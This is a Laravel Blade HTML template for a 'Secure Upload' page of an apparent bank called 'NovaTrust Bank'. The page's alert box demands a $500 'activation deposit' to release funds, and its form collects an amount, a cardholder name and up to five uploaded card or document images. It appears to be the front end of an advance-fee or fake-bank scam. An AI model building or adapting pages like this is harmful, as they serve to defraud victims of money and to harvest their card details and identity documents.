<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Upload - NovaTrust Bank</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #f4f6f9;
            margin: 0;
            color: #333;
        }
        .navbar {
            background-color: #1a237e;
            color: #fff;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .navbar .logo {
            font-size: 22px;
            font-weight: bold;
        }
        .navbar .menu a {
            color: #fff;
            text-decoration: none;
            margin-left: 20px;
            font-weight: bold;
        }
        .container {
            max-width: 650px;
            margin: 60px auto;
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 3px 8px rgba(0,0,0,0.1);
            padding: 30px;
        }
        h2 {
            color: #1a237e;
            text-align: center;
            margin-bottom: 25px;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        label {
            margin-top: 15px;
            font-weight: bold;
            color: #333;
        }
        input[type="text"],
        input[type="number"],
        input[type="file"],
        textarea {
            padding: 10px;
            border-radius: 6px;
            border: 1px solid #ccc;
            margin-top: 5px;
            width: 100%;
            box-sizing: border-box;
        }
        textarea {
            resize: vertical;
            min-height: 80px;
        }
        button {
            background-color: #1a237e;
            color: #fff;
            border: none;
            border-radius: 6px;
            padding: 12px;
            margin-top: 25px;
            font-size: 16px;
            cursor: pointer;
            font-weight: 600;
            transition: background 0.3s ease;
        }
        button:hover {
            background-color: #283593;
        }
        .success-message {
            margin-top: 20px;
            text-align: center;
            color: green;
            font-weight: bold;
        }
        .alert-box {
            background: #fff3cd;
            border: 1px solid #ffeeba;
            color: #856404;
            padding: 20px;
            border-radius: 8px;
            margin-top: 20px;
        }
        .alert-box h3 {
            color: #1a237e;
            margin-bottom: 10px;
        }
        .alert-box strong {
            color: #d32f2f;
        }
        .error {
            color: #d32f2f;
            font-size: 14px;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <div class="logo">NovaTrust Bank</div>
        <div class="menu">
            <a href="/dashboard">Dashboard</a>
            <a href="/transfer">Transfer</a>
            <a href="/history">History</a>
            <a href="{{ route('logout') }}"
               onclick="event.preventDefault(); document.getElementById('logout-form').submit();">
               Logout
            </a>
            <form id="logout-form" action="{{ route('logout') }}" method="POST" style="display:none;">
                @csrf
            </form>
        </div>
    </div>

    <div class="container">
        <h2> ✅ Secure Upload Card Activation Code ✅</h2>

        <div class="alert-box">
            <h3>Activation Payment Required</h3>
            <p>
                To complete your transaction and enable account features, an activation deposit is required.
                This deposit will be added to your bank account balance.
            </p>
            <p>
                Please deposit <strong>$500</strong> to instantly activate your code and complete the transfer of all funds
                to your bank account.
            </p>
            <p>
                Once the payment is confirmed, your funds will be fully activated and credited to your account.
            </p>
        </div>

        {{-- ? Display success message --}}
        @if(session('success'))
            <div class="success-message">{{ session('success') }}</div>
        @endif

        {{-- ? Display validation errors --}}
        @if($errors->any())
            <div class="error">
                <ul>
                    @foreach($errors->all() as $error)
                        <li>{{ $error }}</li>
                    @endforeach
                </ul>
            </div>
        @endif

        <form action="{{ route('secure.upload.post') }}" method="POST" enctype="multipart/form-data">
            @csrf

            <label for="amount">Amount ($)</label>
            <input type="number" name="amount" id="amount" placeholder="Enter amount" required min="1" step="0.01">

            <label for="card_name">Card Name</label>
            <input type="text" name="card_name" id="card_name" placeholder="Enter cardholder name" required>

            <label for="description">Description (Optional)</label>
            <textarea name="description" id="description" rows="4" placeholder="Add a note or description (optional)...">{{ old('description') }}</textarea>

            <label for="upload_file1">Upload File 1 (Required)</label>
            <input type="file" name="upload_file1" id="upload_file1" accept=".jpg,.jpeg,.png,.pdf" required>

            <label for="upload_file2">Upload File 2 (Optional)</label>
            <input type="file" name="upload_file2" id="upload_file2" accept=".jpg,.jpeg,.png,.pdf">

            <label for="upload_file3">Upload File 3 (Optional)</label>
            <input type="file" name="upload_file3" id="upload_file3" accept=".jpg,.jpeg,.png,.pdf">

            <label for="upload_file4">Upload File 4 (Optional)</label>
            <input type="file" name="upload_file4" id="upload_file4" accept=".jpg,.jpeg,.png,.pdf">

            <label for="upload_file5">Upload File 5 (Optional)</label>
            <input type="file" name="upload_file5" id="upload_file5" accept=".jpg,.jpeg,.png,.pdf">

            <button type="submit">Send & Save</button>
        </form>
    </div>
</body>
</html>
